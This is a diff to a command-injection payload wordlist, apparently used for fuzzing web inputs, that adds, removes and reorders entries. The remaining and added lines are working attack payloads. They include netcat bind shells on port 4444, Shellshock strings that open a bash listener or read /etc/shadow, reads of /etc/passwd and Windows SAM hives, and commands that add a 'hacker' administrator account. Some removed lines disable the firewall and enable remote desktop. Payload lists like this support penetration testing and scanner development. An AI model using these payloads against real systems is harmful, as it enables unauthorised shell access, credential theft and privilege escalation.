@@ -17,7 +17,6 @@ $$
 $(`cat /etc/passwd`)
 $(`dir`)
 $(`ls`)
-$(`type c:\boot.ini`)
 $(`whoami`)
 $(a="whoami";printf %s "${a,,}")
 $(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
@@ -55,6 +54,7 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 %08/etc/passwd
 %08id
 %09id
+%0Aadmin%201
 %0a id %0a
 %0a ping -i 30 127.0.0.1 %0a
 %0a sleep 10
@@ -74,6 +74,8 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 %0d/etc/passwd%7f%7f%7f
 %0d/etc/passwd%7f%7f%7f%7f
 %0d/etc/passwd%7f%7f%7f%7f%7f
+%0dcat /etc/passwd
+%0dcat/etc/passwd%00
 %0did
 %2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1`
 %2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
@@ -90,27 +92,18 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 & ipconfig /all
 & ls -l /
 & ls -l /etc/
-& ls -l /home/*
-& ls -l /tmp
-& ls -l /var/www/*
 & ls -lar /etc
 & ls -lar /var/www
 & nc -lvvp 4444 -e /bin/sh&
 & net localgroup administrators hacker /add
 & net user hacker password1 /add
 & net view
-& netsh firewall set opmode disable
 & netstat -an
 & perl -e 'print "x"x16096'
-& perl -e 'print "x"x2048'
-& perl -e 'print "x"x4096'
 & phpinfo()
 & ping -i 30 127.0.0.1 &
-& ping -n 30 127.0.0.1 &
 & pwd
-& reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
 & sleep 5
-& sysinfo
 & system('sleep 5');
 & systeminfo
 & type %systemroot%\repair\sam
@@ -128,21 +121,16 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 && ipconfig /all
 && ls -l /
 && ls -l /etc/
-&& ls -l /home/*
-&& ls -l /tmp
-&& ls -l /var/www/*
 && ls -lar /etc
 && ls -lar /var/www
 && nc -lvvp 4444 -e /bin/sh &
 && net localgroup administrators hacker /add
 && net user hacker password1 /add
 && net view
-&& netsh firewall set opmode disable
 && netstat -an
 && perl -e 'print "x"x16096'
 && phpinfo()
 && pwd
-&& reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
 && sleep 5
 && sysinfo
 && system('sleep 5');
@@ -174,16 +162,12 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 '|id|'
 '||/usr/bin/id|'
 () { :;}; /bin/bash -c "\`grep root /etc/shadow\`"
-() { :;}; /bin/bash -c "\`nc -lvvp 1234 -e /bin/bash\`"
-() { :;}; /bin/bash -c "\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "\`nc -lvvp 2035 -e /bin/bash\`"
 () { :;}; /bin/bash -c "\`pwd\`"
 () { :;}; /bin/bash -c "\`uname -a\`"
 () { :;}; /bin/bash -c "\`whoami\`"
 () { :;}; /bin/bash -c "pwd"
-() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
-() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
 () { :;}; /bin/bash -c "sleep 5 && echo vulnerable 1"
-() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
 () { :;}; echo vulnerable 10
 () { :;};/usr/bin/perl -e 'print \"content-type: text/plain\\r\\n\\r\\nxsuccess!\";system(\"pwd\");'
 *; ls -lhtr /var/www/
@@ -214,14 +198,11 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 ; net localgroup administrators hacker /add
 ; net user hacker password1 /add
 ; net view
-; netsh firewall set opmode disable
 ; netstat -an
 ; perl -e 'print "x"x16096'
 ; ping 127.0.0.1 ;
 ; pwd
-; reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
 ; sleep 5
-; sysinfo
 ; system('sleep 5');
 ; systeminfo
 ; type %systemroot%\repair\sam
@@ -243,8 +224,7 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 ;system('/usr/bin/id')
 ;system('cat%20/etc/passwd')
 ;system('id')
-;uname;
-;{$_get["cmd"]}
+;uname -a;
 ;|/usr/bin/id|
 <!--#config errmsg="file not found, informs users and password"-->
 <!--#config timefmt="a %b %d %y %r"-->
@@ -442,15 +422,11 @@ ls|id;
 ls|| id;
 ls||id;
 nc -lvvp 4444 -e /bin/sh
-nc -lvvp 4445 -e /bin/sh &
-nc -lvvp 4446 -e /bin/sh|
-nc -lvvp 4447 -e /bin/sh;
-nc -lvvp 4448 -e /bin/sh&
+nc -lvvp 4444 -e /bin/sh;
+nc -lvvp 4444 -e /bin/sh|
 net localgroup administrators hacker /add
 net user hacker password1 /add
 net view
-netsh firewall set opmode disable
-netstat
 netstat -an
 p$(u)i$(u)n$(u)g
 p$(u)i$(u)n$(u)g 127.0.0.1
@@ -459,14 +435,9 @@ p${u}i${u}n${u}g 127.0.0.1
 perl -e 'print "x"x1024'
 printf %.1s "$pwd"
 pwd
-reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
 sleep 5
-sysinfo
 system('cat /etc/passwd');
-system('cat c:\boot.ini');
-system('cat config.php');
 system('echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
-system('ls')
 system('pwd')
 system('pwd');
 system('sleep 5')
@@ -487,16 +458,10 @@ type c:\windows\repair\sam
 type c:\windows\repair\system
 type c:\winnt\repair\sam
 type c:\winnt\repair\system
-uname
 uname -a
-uname!-1\-a
 uniq [a-z][a-z][a-z][a-z].[a-z][a-z][a-z]
 w`u`h`u`o`u`a`u`m`u`i
 which curl
-which gcc
-which nc
-which netcat
-which perl
 which python
 which wget
 while read -r line; do echo $line; done < /etc/passwd
@@ -504,9 +469,7 @@ who$@ami
 whoami
 x=$'cat\x20/etc/passwd'&&$x
 xxd -r -ps <(echo 2f6574632f706173737764)
-{% for c in [1,2,3]%} {{c, c, c}} {% endfor%}
-{1} + {1}
-{cat,lol.txt}
+{cat,/etc/passwd}
 {echo,test}
 | dir
 | dir c:\
@@ -517,23 +480,17 @@ xxd -r -ps <(echo 2f6574632f706173737764)
 | ipconfig /all
 | ls -l /
 | ls -l /etc/
-| ls -l /home/*
-| ls -l /tmp
-| ls -l /var/www/*
 | ls -lar /etc
 | ls -lar /var/www
 | nc -lvvp 4444 -e /bin/sh|
 | net localgroup administrators hacker /add
 | net user hacker password1 /add
 | net view
-| netsh firewall set opmode disable
 | netstat -an
 | perl -e 'print "x"x16096'
 | phpinfo()
 | pwd
-| reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
 | sleep 5
-| sysinfo
 | system('sleep 5');
 | systeminfo
 | type %systemroot%\repair\sam
@@ -546,12 +503,12 @@ xxd -r -ps <(echo 2f6574632f706173737764)
 |/bin/ls -al
 |/usr/bin/id
 |/usr/bin/id|
+|\nid\n
 |id
 |id;
 |id|
 |ls
 |ls -la
-|nid\n
 |usr/bin/id\n
 || perl -e 'print "x"x16096'
 || phpinfo()
@@ -561,4 +518,3 @@ xxd -r -ps <(echo 2f6574632f706173737764)
 ||/usr/bin/id;
 ||/usr/bin/id|
 ||id
-%0Aadmin%201
